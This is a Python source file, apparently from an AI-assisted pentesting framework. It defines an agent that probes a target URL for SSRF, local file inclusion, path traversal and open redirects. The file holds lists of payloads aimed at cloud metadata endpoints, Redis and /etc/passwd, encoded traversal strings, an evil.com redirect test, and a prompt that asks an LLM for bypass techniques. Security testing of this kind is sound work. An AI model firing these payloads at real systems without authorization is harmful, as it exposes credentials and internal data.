"""
SPECTER SSRF Agent
Tests for Server-Side Request Forgery, Local File Inclusion, and path traversal.
"""

import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from core.agent_base import BaseAgent
from tools.http_client import HTTPClient

logger = logging.getLogger("specter.ssrf")

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",                    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata full
    "http://metadata.google.internal",           # GCP metadata
    "http://100.100.100.200",                    # Alibaba metadata
    "http://0.0.0.0",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "dict://127.0.0.1:6379/info",               # Redis
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-ipv4",   # AWS metadata
    "computeMetadata",                          # GCP
    "root:x:0:0",                              # /etc/passwd
    "localhost",
    "[extensions]",                             # win.ini
    "ssh-",                                    # SSH banner
    "+PONG",                                   # Redis
]

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "..%c0%afetc%c0%afpasswd",
]

LFI_SIGNATURES = [
    "root:x:0:0", "nobody:x:", "daemon:x:",
    "[extensions]", "for 16-bit app support",
    "bin/bash", "bin/sh",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect",
    "next", "return", "returnUrl", "return_url", "callback",
    "data", "reference", "site", "html", "val", "validate",
    "domain", "file", "page", "feed", "host", "port", "to",
    "out", "view", "dir", "show", "navigation", "open",
]


class SSRFAgent(BaseAgent):
    def __init__(self, router, target, config):
        super().__init__(router, target, config)
        self.name = "SSRFAgent"
        self.http = HTTPClient()

    def system_prompt(self):
        return (
            f"You are an SSRF and LFI expert pentester. Target: {self.target}\n"
            "Analyze test results for:\n"
            "- Server-Side Request Forgery (SSRF)\n"
            "- Local File Inclusion (LFI)\n"
            "- Path traversal\n"
            "Confirm only if there is clear evidence (metadata response, file contents)."
        )

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _test_ssrf(self, url: str, param: str) -> dict | None:
        for payload in SSRF_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue
            body = resp.text.lower()
            for sig in SSRF_SIGNATURES:
                if sig.lower() in body:
                    return {
                        "param":    param,
                        "payload":  payload,
                        "url":      test_url,
                        "evidence": sig,
                    }
        return None

    def _test_lfi(self, url: str, param: str) -> dict | None:
        for payload in LFI_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            resp = self.http.get(test_url)
            if not resp:
                continue
            for sig in LFI_SIGNATURES:
                if sig in resp.text:
                    return {
                        "param":    param,
                        "payload":  payload,
                        "url":      test_url,
                        "evidence": sig,
                    }
        return None

    def _find_ssrf_params(self, url: str) -> list[str]:
        """Find parameters that are likely SSRF targets."""
        parsed = urlparse(url)
        all_params = list(parse_qs(parsed.query).keys())
        return [p for p in all_params if p.lower() in SSRF_PARAM_NAMES] or all_params

    def _check_open_redirect(self, url: str) -> list:
        """Test for open redirects — often a stepping stone to SSRF."""
        issues = []
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        redirect_params = [p for p in params if p.lower() in
                           ["redirect", "next", "url", "return", "returnurl", "dest", "goto"]]

        for param in redirect_params:
            test_url = self._inject_param(url, param, "https://evil.com")
            resp = self.http.get(test_url)
            if resp and ("evil.com" in resp.url or resp.status_code in [301, 302] and "evil.com" in resp.headers.get("Location", "")):
                issues.append({
                    "param": param,
                    "url":   test_url,
                })
        return issues

    def run(self) -> list:
        from rich.console import Console
        console = Console()
        console.print(f"\n[bold cyan][ SSRFAgent ][/bold cyan] Target: {self.target}")

        # 1. Find SSRF-likely parameters
        ssrf_params = self._find_ssrf_params(self.target)
        console.print(f"  [→] SSRF-candidate params: {ssrf_params or 'none in URL'}")

        # 2. Test SSRF
        for param in ssrf_params:
            console.print(f"  [→] SSRF testing '{param}'...")
            result = self._test_ssrf(self.target, param)
            if result:
                self.add_finding(
                    severity="CRITICAL",
                    title=f"SSRF in parameter '{param}'",
                    description=f"Server fetched internal resource. Evidence: '{result['evidence']}' in response.",
                    poc=f"curl \"{result['url']}\"",
                    remediation="Whitelist allowed URLs. Block internal IP ranges. Disable unnecessary URL-fetching features.",
                    endpoint=self.target,
                )

            # 3. Test LFI
            console.print(f"  [→] LFI testing '{param}'...")
            result = self._test_lfi(self.target, param)
            if result:
                self.add_finding(
                    severity="CRITICAL",
                    title=f"Local File Inclusion in '{param}'",
                    description=f"Server returned local file contents. Evidence: '{result['evidence']}'",
                    poc=f"curl \"{result['url']}\"",
                    remediation="Validate and sanitize file path inputs. Use whitelisted file names. Disable directory traversal.",
                    endpoint=self.target,
                )

        # 4. Open redirect check
        console.print("  [→] Testing for open redirects...")
        redirects = self._check_open_redirect(self.target)
        for r in redirects:
            self.add_finding(
                severity="MEDIUM",
                title=f"Open Redirect via '{r['param']}'",
                description="The application redirects to attacker-controlled URLs — can be chained with SSRF or phishing.",
                poc=f"curl -v \"{r['url']}\"",
                remediation="Validate redirect destinations against a whitelist of allowed domains.",
                endpoint=self.target,
            )

        # 5. LLM analysis
        console.print("  [→] LLM SSRF/LFI analysis...")
        prompt = (
            f"SSRF/LFI scan results for {self.target}:\n"
            f"Params tested: {ssrf_params}\n"
            f"Findings so far: {len(self.findings)}\n"
            "What other SSRF vectors should be checked? Any cloud-specific metadata endpoints or bypass techniques?"
        )
        advice = self.think(prompt)
        console.print(f"\n[dim]{advice[:500]}[/dim]\n")

        console.print(f"[green][ SSRFAgent ][/green] Complete — {len(self.findings)} finding(s)\n")
        return self.findings
